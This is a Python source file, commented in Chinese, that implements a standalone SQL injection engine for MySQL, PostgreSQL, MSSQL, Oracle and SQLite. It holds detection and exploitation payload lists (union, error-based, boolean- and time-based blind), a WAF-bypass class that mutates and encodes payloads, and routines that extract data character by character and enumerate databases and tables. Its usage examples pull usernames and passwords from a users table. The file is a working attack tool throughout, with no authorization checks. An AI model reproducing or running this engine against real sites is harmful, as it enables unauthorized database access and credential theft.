#!/usr/bin/env python3
"""
纯 Python SQL 注入引擎 - Pure SQLi Engine
功能: 检测、利用、数据提取，无需 sqlmap 依赖
支持: MySQL, PostgreSQL, MSSQL, Oracle, SQLite
"""

import re
import time
import string
import asyncio
import logging
from typing import Dict, List, Optional, Tuple, Any, Callable
from dataclasses import dataclass, field
from enum import Enum
from urllib.parse import urlencode, quote, urlparse, parse_qs
import random

logger = logging.getLogger(__name__)

# HTTP 请求库
try:
    import httpx
    HAS_HTTPX = True
except ImportError:
    HAS_HTTPX = False

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

# 统一 HTTP 客户端工厂
try:
    from core.http import get_sync_client
    HAS_HTTP_FACTORY = True
except ImportError:
    HAS_HTTP_FACTORY = False


class SQLiType(Enum):
    """SQL注入类型"""
    UNION = "union"  # 联合查询注入
    ERROR = "error"  # 报错注入
    BLIND_BOOLEAN = "blind_boolean"  # 布尔盲注
    BLIND_TIME = "blind_time"  # 时间盲注
    STACKED = "stacked"  # 堆叠查询
    OOB = "oob"  # 带外注入


class DBType(Enum):
    """数据库类型"""
    MYSQL = "mysql"
    POSTGRESQL = "postgresql"
    MSSQL = "mssql"
    ORACLE = "oracle"
    SQLITE = "sqlite"
    UNKNOWN = "unknown"


@dataclass
class SQLiResult:
    """SQL注入检测结果"""
    vulnerable: bool
    sqli_type: Optional[SQLiType] = None
    db_type: Optional[DBType] = None
    payload: str = ""
    evidence: str = ""
    confidence: float = 0.0
    extracted_data: Dict[str, Any] = field(default_factory=dict)


@dataclass
class InjectionPoint:
    """注入点"""
    url: str
    method: str  # GET, POST
    param: str
    original_value: str
    position: str  # query, body, header, cookie


class PayloadGenerator:
    """Payload 生成器"""

    # 通用检测 Payload
    DETECTION_PAYLOADS = {
        "basic": [
            "'",
            "\"",
            "'--",
            "\"--",
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "1' AND '1'='1",
            "1\" AND \"1\"=\"1",
            "' OR 1=1--",
            "\" OR 1=1--",
            "') OR ('1'='1",
            "\") OR (\"1\"=\"1",
        ],
        "numeric": [
            "1 OR 1=1",
            "1 AND 1=1",
            "1 AND 1=2",
            "1-1",
            "1*1",
            "1+0",
        ],
        "time_based": {
            DBType.MYSQL: [
                "' AND SLEEP(5)--",
                "\" AND SLEEP(5)--",
                "1' AND SLEEP(5)--",
                "1 AND SLEEP(5)",
                "'; WAITFOR DELAY '0:0:5'--",
            ],
            DBType.POSTGRESQL: [
                "' AND pg_sleep(5)--",
                "1 AND pg_sleep(5)",
            ],
            DBType.MSSQL: [
                "'; WAITFOR DELAY '0:0:5'--",
                "1; WAITFOR DELAY '0:0:5'",
            ],
        }
    }

    # Union 注入 Payload
    UNION_PAYLOADS = [
        "' UNION SELECT {cols}--",
        "\" UNION SELECT {cols}--",
        "') UNION SELECT {cols}--",
        "\") UNION SELECT {cols}--",
        "' UNION ALL SELECT {cols}--",
        "' UNION SELECT {cols}#",
        "1' UNION SELECT {cols}--",
        "-1' UNION SELECT {cols}--",
        "1 UNION SELECT {cols}",
        "-1 UNION SELECT {cols}",
    ]

    # 报错注入 Payload
    ERROR_PAYLOADS = {
        DBType.MYSQL: [
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT {query}),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT {query})))--",
            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT {query})),1)--",
            "' AND EXP(~(SELECT * FROM (SELECT {query})x))--",
        ],
        DBType.POSTGRESQL: [
            "' AND CAST((SELECT {query}) AS INT)--",
            "' AND 1=CAST((SELECT {query}) AS INT)--",
        ],
        DBType.MSSQL: [
            "' AND 1=CONVERT(INT,(SELECT {query}))--",
            "' AND 1=(SELECT TOP 1 CAST({query} AS NVARCHAR(4000)) FROM {table})--",
        ],
    }

    # 数据库识别
    DB_FINGERPRINT = {
        DBType.MYSQL: {
            "version": "SELECT @@version",
            "user": "SELECT user()",
            "database": "SELECT database()",
            "tables": "SELECT table_name FROM information_schema.tables WHERE table_schema=database()",
            "columns": "SELECT column_name FROM information_schema.columns WHERE table_name='{table}'",
        },
        DBType.POSTGRESQL: {
            "version": "SELECT version()",
            "user": "SELECT current_user",
            "database": "SELECT current_database()",
            "tables": "SELECT table_name FROM information_schema.tables WHERE table_schema='public'",
            "columns": "SELECT column_name FROM information_schema.columns WHERE table_name='{table}'",
        },
        DBType.MSSQL: {
            "version": "SELECT @@version",
            "user": "SELECT SYSTEM_USER",
            "database": "SELECT DB_NAME()",
            "tables": "SELECT name FROM sysobjects WHERE xtype='U'",
            "columns": "SELECT name FROM syscolumns WHERE id=OBJECT_ID('{table}')",
        },
        DBType.SQLITE: {
            "version": "SELECT sqlite_version()",
            "tables": "SELECT name FROM sqlite_master WHERE type='table'",
            "columns": "PRAGMA table_info({table})",
        },
    }

    @classmethod
    def generate_union_payload(cls, columns: int, position: int = 1,
                               db_type: DBType = DBType.MYSQL) -> List[str]:
        """生成 Union 注入 Payload"""
        payloads = []

        # 构造列填充
        cols = []
        for i in range(1, columns + 1):
            if i == position:
                cols.append("@@version" if db_type == DBType.MYSQL else "version()")
            else:
                cols.append("NULL")

        col_str = ','.join(cols)

        for template in cls.UNION_PAYLOADS:
            payloads.append(template.format(cols=col_str))

        return payloads

    @classmethod
    def generate_error_payload(cls, query: str, db_type: DBType) -> List[str]:
        """生成报错注入 Payload"""
        templates = cls.ERROR_PAYLOADS.get(db_type, cls.ERROR_PAYLOADS[DBType.MYSQL])
        return [t.format(query=query, table='users') for t in templates]

    @classmethod
    def generate_blind_boolean_payload(cls, condition: str) -> List[str]:
        """生成布尔盲注 Payload"""
        return [
            f"' AND ({condition})--",
            f"\" AND ({condition})--",
            f"1' AND ({condition})--",
            f"1 AND ({condition})",
        ]

    @classmethod
    def generate_blind_time_payload(cls, seconds: int, db_type: DBType) -> List[str]:
        """生成时间盲注 Payload"""
        if db_type == DBType.MYSQL:
            return [
                f"' AND SLEEP({seconds})--",
                f"1' AND SLEEP({seconds})--",
                f"1 AND SLEEP({seconds})",
                f"' AND (SELECT * FROM (SELECT(SLEEP({seconds})))a)--",
            ]
        elif db_type == DBType.POSTGRESQL:
            return [
                f"' AND pg_sleep({seconds})--",
                f"1 AND pg_sleep({seconds})",
            ]
        elif db_type == DBType.MSSQL:
            return [
                f"'; WAITFOR DELAY '0:0:{seconds}'--",
                f"1; WAITFOR DELAY '0:0:{seconds}'",
            ]
        return []


class WAFBypass:
    """WAF 绕过技术"""

    @staticmethod
    def case_mutation(payload: str) -> str:
        """大小写变异"""
        keywords = ['SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR',
                    'INSERT', 'UPDATE', 'DELETE', 'DROP', 'SLEEP', 'BENCHMARK']
        result = payload
        for kw in keywords:
            if kw.lower() in payload.lower():
                mutated = ''.join(
                    c.upper() if random.random() > 0.5 else c.lower()
                    for c in kw
                )
                result = re.sub(kw, mutated, result, flags=re.IGNORECASE)
        return result

    @staticmethod
    def space_bypass(payload: str) -> str:
        """空格绕过"""
        alternatives = ['/**/','%20','%09','%0a','%0b','%0c','%0d','+']
        return payload.replace(' ', random.choice(alternatives))

    @staticmethod
    def comment_injection(payload: str) -> str:
        """注释插入"""
        keywords = ['SELECT', 'UNION', 'FROM', 'WHERE']
        result = payload
        for kw in keywords:
            if kw in result.upper():
                # S/**/E/**/L/**/E/**/C/**/T
                commented = '/**/'.join(kw)
                result = re.sub(kw, commented, result, flags=re.IGNORECASE)
        return result

    @staticmethod
    def double_encoding(payload: str) -> str:
        """双重URL编码"""
        return quote(quote(payload))

    @staticmethod
    def hex_encoding(payload: str) -> str:
        """十六进制编码"""
        # 将字符串转换为十六进制
        hex_str = '0x' + payload.encode().hex()
        return hex_str

    @staticmethod
    def unicode_bypass(payload: str) -> str:
        """Unicode 绕过"""
        replacements = {
            "'": "%u0027",
            "\"": "%u0022",
            " ": "%u0020",
            "=": "%u003d",
        }
        result = payload
        for char, unicode_char in replacements.items():
            result = result.replace(char, unicode_char)
        return result

    @classmethod
    def apply_all(cls, payload: str) -> List[str]:
        """应用所有绕过技术"""
        variants = [
            payload,
            cls.case_mutation(payload),
            cls.space_bypass(payload),
            cls.comment_injection(payload),
            cls.double_encoding(payload),
        ]
        return variants


class HTTPClient:
    """HTTP 客户端封装"""

    def __init__(self, timeout: float = 10.0, verify_ssl: bool = False,
                 proxy: Optional[str] = None):
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.proxy = proxy
        self._session = None

    def _get_session(self):
        if self._session is None:
            if HAS_HTTP_FACTORY:
                # 优先使用统一 HTTP 客户端工厂
                self._session = get_sync_client(
                    verify_ssl=self.verify_ssl,
                    proxy=self.proxy,
                    force_new=True
                )
            elif HAS_REQUESTS:
                import requests
                self._session = requests.Session()
                self._session.verify = self.verify_ssl
                if self.proxy:
                    self._session.proxies = {
                        "http": self.proxy,
                        "https": self.proxy,
                    }
        return self._session

    def request(self, method: str, url: str, **kwargs) -> Tuple[int, str, float]:
        """
        发送请求

        Returns:
            (status_code, response_text, response_time)
        """
        kwargs.setdefault('timeout', self.timeout)
        kwargs.setdefault('verify', self.verify_ssl)

        start_time = time.time()

        try:
            session = self._get_session()
            if session:
                resp = session.request(method, url, **kwargs)
                return resp.status_code, resp.text, time.time() - start_time
            else:
                logger.error("No HTTP library available")
                return 0, "", 0.0
        except Exception as e:
            logger.debug(f"Request failed: {e}")
            return 0, str(e), time.time() - start_time

    def close(self):
        if self._session:
            self._session.close()


class PureSQLiEngine:
    """
    纯 Python SQL 注入引擎

    Usage:
        engine = PureSQLiEngine()

        # 检测注入
        result = engine.detect(
            url="http://target.com/page.php",
            method="GET",
            param="id",
            value="1"
        )

        if result.vulnerable:
            print(f"SQLi Type: {result.sqli_type.value}")
            print(f"DB Type: {result.db_type.value}")

            # 提取数据
            data = engine.extract_data(
                injection_point=engine.injection_point,
                query="SELECT username,password FROM users"
            )
    """

    # 错误关键字 (用于检测)
    ERROR_PATTERNS = {
        DBType.MYSQL: [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"check the manual that corresponds to your (MySQL|MariaDB)",
            r"MySqlException",
            r"com\.mysql\.jdbc",
        ],
        DBType.POSTGRESQL: [
            r"PostgreSQL.*ERROR",
            r"Warning.*\Wpg_",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"PG::SyntaxError",
            r"org\.postgresql\.util\.PSQLException",
        ],
        DBType.MSSQL: [
            r"Driver.* SQL[\-\_\ ]*Server",
            r"OLE DB.* SQL Server",
            r"(\W|\A)SQL Server.*Driver",
            r"Warning.*mssql_",
            r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}",
            r"System\.Data\.SqlClient\.",
            r"Unclosed quotation mark after the character string",
        ],
        DBType.ORACLE: [
            r"\bORA-[0-9][0-9][0-9][0-9]",
            r"Oracle error",
            r"Oracle.*Driver",
            r"Warning.*\Woci_",
            r"Warning.*\Wora_",
        ],
        DBType.SQLITE: [
            r"SQLite/JDBCDriver",
            r"SQLite\.Exception",
            r"System\.Data\.SQLite\.SQLiteException",
            r"Warning.*sqlite_",
            r"Warning.*SQLite3::",
            r"\[SQLITE_ERROR\]",
        ],
    }

    def __init__(self,
                 timeout: float = 10.0,
                 time_threshold: float = 5.0,
                 waf_bypass: bool = True,
                 proxy: Optional[str] = None):
        """
        Args:
            timeout: HTTP 请求超时
            time_threshold: 时间盲注检测阈值
            waf_bypass: 是否启用 WAF 绕过
            proxy: 代理地址
        """
        self.http = HTTPClient(timeout=timeout, proxy=proxy)
        self.time_threshold = time_threshold
        self.waf_bypass = waf_bypass

        self.injection_point: Optional[InjectionPoint] = None
        self._baseline_time = 0.0
        self._baseline_length = 0

    def detect(self,
               url: str,
               method: str = "GET",
               param: str = "",
               value: str = "",
               headers: Optional[Dict] = None,
               data: Optional[Dict] = None) -> SQLiResult:
        """
        检测 SQL 注入漏洞

        Args:
            url: 目标 URL
            method: HTTP 方法
            param: 参数名
            value: 参数原始值
            headers: 自定义 Headers
            data: POST 数据

        Returns:
            SQLiResult 检测结果
        """
        # 获取基线响应
        self._get_baseline(url, method, param, value, headers, data)

        # 创建注入点
        self.injection_point = InjectionPoint(
            url=url,
            method=method,
            param=param,
            original_value=value,
            position="query" if method == "GET" else "body"
        )

        # 1. 检测报错注入
        result = self._detect_error_based(url, method, param, value, headers, data)
        if result.vulnerable:
            return result

        # 2. 检测布尔盲注
        result = self._detect_blind_boolean(url, method, param, value, headers, data)
        if result.vulnerable:
            return result

        # 3. 检测时间盲注
        result = self._detect_blind_time(url, method, param, value, headers, data)
        if result.vulnerable:
            return result

        # 4. 检测 Union 注入
        result = self._detect_union(url, method, param, value, headers, data)
        if result.vulnerable:
            return result

        return SQLiResult(vulnerable=False)

    def _get_baseline(self, url: str, method: str, param: str, value: str,
                      headers: Optional[Dict], data: Optional[Dict]):
        """获取基线响应"""
        status, text, resp_time = self._send_payload(
            url, method, param, value, headers, data
        )
        self._baseline_time = resp_time
        self._baseline_length = len(text)

    def _send_payload(self, url: str, method: str, param: str, payload: str,
                      headers: Optional[Dict] = None,
                      data: Optional[Dict] = None) -> Tuple[int, str, float]:
        """发送带有 Payload 的请求"""
        headers = headers or {}

        if method.upper() == "GET":
            # URL 参数注入
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            params[param] = [payload]
            query = urlencode(params, doseq=True)
            target_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"
            return self.http.request("GET", target_url, headers=headers)
        else:
            # POST 数据注入
            post_data = data.copy() if data else {}
            post_data[param] = payload
            return self.http.request("POST", url, headers=headers, data=post_data)

    def _detect_error_based(self, url: str, method: str, param: str, value: str,
                            headers: Optional[Dict],
                            data: Optional[Dict]) -> SQLiResult:
        """检测报错注入"""
        for payload in PayloadGenerator.DETECTION_PAYLOADS["basic"]:
            test_payloads = [payload]

            if self.waf_bypass:
                test_payloads.extend(WAFBypass.apply_all(payload))

            for test_payload in test_payloads:
                status, text, _ = self._send_payload(
                    url, method, param, value + test_payload, headers, data
                )

                db_type, evidence = self._check_error_patterns(text)

                if db_type != DBType.UNKNOWN:
                    return SQLiResult(
                        vulnerable=True,
                        sqli_type=SQLiType.ERROR,
                        db_type=db_type,
                        payload=test_payload,
                        evidence=evidence,
                        confidence=0.9
                    )

        return SQLiResult(vulnerable=False)

    def _check_error_patterns(self, text: str) -> Tuple[DBType, str]:
        """检查错误模式"""
        for db_type, patterns in self.ERROR_PATTERNS.items():
            for pattern in patterns:
                match = re.search(pattern, text, re.IGNORECASE)
                if match:
                    return db_type, match.group(0)
        return DBType.UNKNOWN, ""

    def _detect_blind_boolean(self, url: str, method: str, param: str, value: str,
                              headers: Optional[Dict],
                              data: Optional[Dict]) -> SQLiResult:
        """检测布尔盲注"""
        # True 条件
        true_payload = f"{value}' AND '1'='1"
        status_true, text_true, _ = self._send_payload(
            url, method, param, true_payload, headers, data
        )

        # False 条件
        false_payload = f"{value}' AND '1'='2"
        status_false, text_false, _ = self._send_payload(
            url, method, param, false_payload, headers, data
        )

        # 比较响应差异
        len_diff = abs(len(text_true) - len(text_false))
        baseline_diff = abs(len(text_true) - self._baseline_length)

        # 如果 True/False 响应明显不同，且 True 响应接近基线
        if len_diff > 50 and baseline_diff < len_diff:
            return SQLiResult(
                vulnerable=True,
                sqli_type=SQLiType.BLIND_BOOLEAN,
                db_type=DBType.UNKNOWN,
                payload=true_payload,
                evidence=f"Response length diff: {len_diff}",
                confidence=0.8
            )

        return SQLiResult(vulnerable=False)

    def _detect_blind_time(self, url: str, method: str, param: str, value: str,
                           headers: Optional[Dict],
                           data: Optional[Dict]) -> SQLiResult:
        """检测时间盲注"""
        sleep_time = 5

        for db_type in [DBType.MYSQL, DBType.POSTGRESQL, DBType.MSSQL]:
            payloads = PayloadGenerator.generate_blind_time_payload(sleep_time, db_type)

            for payload in payloads:
                test_payload = value + payload
                _, _, resp_time = self._send_payload(
                    url, method, param, test_payload, headers, data
                )

                # 响应时间明显超过基线 + sleep 时间
                if resp_time > self._baseline_time + sleep_time - 1:
                    return SQLiResult(
                        vulnerable=True,
                        sqli_type=SQLiType.BLIND_TIME,
                        db_type=db_type,
                        payload=payload,
                        evidence=f"Response time: {resp_time:.2f}s (baseline: {self._baseline_time:.2f}s)",
                        confidence=0.85
                    )

        return SQLiResult(vulnerable=False)

    def _detect_union(self, url: str, method: str, param: str, value: str,
                      headers: Optional[Dict],
                      data: Optional[Dict]) -> SQLiResult:
        """检测 Union 注入"""
        # 先确定列数
        columns = self._find_column_count(url, method, param, value, headers, data)

        if columns > 0:
            # 生成 Union Payload
            payloads = PayloadGenerator.generate_union_payload(columns)

            for payload in payloads:
                test_payload = value + payload
                status, text, _ = self._send_payload(
                    url, method, param, test_payload, headers, data
                )

                # 检查是否有数据库版本信息
                if self._check_union_success(text):
                    return SQLiResult(
                        vulnerable=True,
                        sqli_type=SQLiType.UNION,
                        db_type=self._fingerprint_db(text),
                        payload=payload,
                        evidence=f"Union injection with {columns} columns",
                        confidence=0.95
                    )

        return SQLiResult(vulnerable=False)

    def _find_column_count(self, url: str, method: str, param: str, value: str,
                           headers: Optional[Dict], data: Optional[Dict]) -> int:
        """查找列数 (ORDER BY 方法)"""
        for i in range(1, 50):
            payload = f"{value}' ORDER BY {i}--"
            status, text, _ = self._send_payload(
                url, method, param, payload, headers, data
            )

            # 检查是否报错
            if status != 200 or "error" in text.lower() or "unknown column" in text.lower():
                return i - 1

        return 0

    def _check_union_success(self, text: str) -> bool:
        """检查 Union 注入是否成功"""
        # 检查版本信息
        patterns = [
            r'\d+\.\d+\.\d+',  # 版本号格式
            r'MySQL',
            r'PostgreSQL',
            r'Microsoft SQL Server',
        ]
        return any(re.search(p, text, re.IGNORECASE) for p in patterns)

    def _fingerprint_db(self, text: str) -> DBType:
        """识别数据库类型"""
        if 'mysql' in text.lower() or 'mariadb' in text.lower():
            return DBType.MYSQL
        elif 'postgresql' in text.lower():
            return DBType.POSTGRESQL
        elif 'microsoft sql server' in text.lower() or 'mssql' in text.lower():
            return DBType.MSSQL
        elif 'oracle' in text.lower():
            return DBType.ORACLE
        elif 'sqlite' in text.lower():
            return DBType.SQLITE
        return DBType.UNKNOWN

    def extract_data(self,
                     injection_point: InjectionPoint,
                     query: str,
                     sqli_type: SQLiType = SQLiType.UNION,
                     db_type: DBType = DBType.MYSQL) -> Optional[str]:
        """
        提取数据

        Args:
            injection_point: 注入点
            query: SQL 查询
            sqli_type: 注入类型
            db_type: 数据库类型

        Returns:
            提取的数据
        """
        if sqli_type == SQLiType.ERROR:
            return self._extract_via_error(injection_point, query, db_type)
        elif sqli_type == SQLiType.BLIND_BOOLEAN:
            return self._extract_via_blind_boolean(injection_point, query, db_type)
        elif sqli_type == SQLiType.BLIND_TIME:
            return self._extract_via_blind_time(injection_point, query, db_type)
        elif sqli_type == SQLiType.UNION:
            return self._extract_via_union(injection_point, query, db_type)
        return None

    def _extract_via_error(self, ip: InjectionPoint, query: str,
                           db_type: DBType) -> Optional[str]:
        """通过报错注入提取数据"""
        payloads = PayloadGenerator.generate_error_payload(query, db_type)

        for payload in payloads:
            _, text, _ = self._send_payload(
                ip.url, ip.method, ip.param,
                ip.original_value + payload
            )

            # 从错误信息中提取数据
            match = re.search(r'~([^~]+)~', text)
            if match:
                return match.group(1)

        return None

    def _extract_via_blind_boolean(self, ip: InjectionPoint, query: str,
                                   db_type: DBType) -> str:
        """通过布尔盲注提取数据 (逐字符)"""
        result = ""
        charset = string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;:',.<>?/"

        for pos in range(1, 100):  # 最多100字符
            found = False
            for char in charset:
                # 构造条件: SUBSTRING(query,pos,1)='char'
                if db_type == DBType.MYSQL:
                    condition = f"SUBSTRING(({query}),{pos},1)='{char}'"
                else:
                    condition = f"SUBSTR(({query}),{pos},1)='{char}'"

                payload = f"' AND ({condition})--"
                _, text, _ = self._send_payload(
                    ip.url, ip.method, ip.param,
                    ip.original_value + payload
                )

                # 判断响应是否为 True
                if len(text) > self._baseline_length - 50:
                    result += char
                    found = True
                    logger.debug(f"Extracted: {result}")
                    break

            if not found:
                break

        return result

    def _extract_via_blind_time(self, ip: InjectionPoint, query: str,
                                db_type: DBType) -> str:
        """通过时间盲注提取数据"""
        result = ""
        charset = string.ascii_letters + string.digits + "_"
        sleep_time = 2

        for pos in range(1, 100):
            found = False
            for char in charset:
                if db_type == DBType.MYSQL:
                    condition = f"IF(SUBSTRING(({query}),{pos},1)='{char}',SLEEP({sleep_time}),0)"
                elif db_type == DBType.POSTGRESQL:
                    condition = f"CASE WHEN SUBSTRING(({query}),{pos},1)='{char}' THEN pg_sleep({sleep_time}) END"
                else:
                    continue

                payload = f"' AND {condition}--"
                _, _, resp_time = self._send_payload(
                    ip.url, ip.method, ip.param,
                    ip.original_value + payload
                )

                if resp_time > sleep_time - 0.5:
                    result += char
                    found = True
                    logger.debug(f"Extracted: {result}")
                    break

            if not found:
                break

        return result

    def _extract_via_union(self, ip: InjectionPoint, query: str,
                           db_type: DBType) -> Optional[str]:
        """通过 Union 注入提取数据"""
        # 需要知道列数
        columns = self._find_column_count(ip.url, ip.method, ip.param,
                                          ip.original_value, None, None)
        if columns <= 0:
            return None

        # 构造 Union 查询
        cols = ['NULL'] * columns
        cols[0] = f"({query})"
        payload = f"' UNION SELECT {','.join(cols)}--"

        _, text, _ = self._send_payload(
            ip.url, ip.method, ip.param,
            ip.original_value + payload
        )

        return text if text else None

    def get_databases(self, ip: InjectionPoint, sqli_type: SQLiType,
                      db_type: DBType) -> List[str]:
        """获取数据库列表"""
        if db_type == DBType.MYSQL:
            query = "SELECT schema_name FROM information_schema.schemata"
        elif db_type == DBType.POSTGRESQL:
            query = "SELECT datname FROM pg_database"
        elif db_type == DBType.MSSQL:
            query = "SELECT name FROM master..sysdatabases"
        else:
            return []

        data = self.extract_data(ip, query, sqli_type, db_type)
        return data.split(',') if data else []

    def get_tables(self, ip: InjectionPoint, sqli_type: SQLiType,
                   db_type: DBType, database: str = "") -> List[str]:
        """获取表列表"""
        query = PayloadGenerator.DB_FINGERPRINT[db_type]["tables"]
        data = self.extract_data(ip, query, sqli_type, db_type)
        return data.split(',') if data else []

    def close(self):
        """关闭 HTTP 客户端"""
        self.http.close()


# 便捷函数
def detect_sqli(url: str, param: str, value: str = "1",
                method: str = "GET") -> SQLiResult:
    """
    检测 SQL 注入 (便捷函数)

    Usage:
        result = detect_sqli("http://target.com/page.php", "id", "1")
        if result.vulnerable:
            print(f"Vulnerable! Type: {result.sqli_type.value}")
    """
    engine = PureSQLiEngine()
    try:
        return engine.detect(url, method, param, value)
    finally:
        engine.close()


def exploit_sqli(url: str, param: str, query: str,
                 sqli_type: str = "union",
                 db_type: str = "mysql") -> Optional[str]:
    """
    利用 SQL 注入提取数据 (便捷函数)

    Usage:
        data = exploit_sqli(
            "http://target.com/page.php",
            "id",
            "SELECT username FROM users LIMIT 1"
        )
    """
    engine = PureSQLiEngine()
    try:
        ip = InjectionPoint(
            url=url, method="GET", param=param,
            original_value="1", position="query"
        )
        return engine.extract_data(
            ip,
            query,
            SQLiType(sqli_type),
            DBType(db_type)
        )
    finally:
        engine.close()


if __name__ == "__main__":
    # 测试
    logging.basicConfig(level=logging.INFO, format='%(levelname)s: %(message)s')
    logger.info("Pure SQLi Engine Test")
    logger.info("=" * 50)

    # 生成 Payload 示例
    logger.info("\nUnion Payloads (5 columns):")
    for p in PayloadGenerator.generate_union_payload(5)[:3]:
        logger.info(f"  {p}")

    logger.info("\nTime-based Payloads (MySQL):")
    for p in PayloadGenerator.generate_blind_time_payload(5, DBType.MYSQL):
        logger.info(f"  {p}")

    logger.info("\nWAF Bypass Variants:")
    payload = "' OR 1=1--"
    for variant in WAFBypass.apply_all(payload):
        logger.info(f"  {variant}")
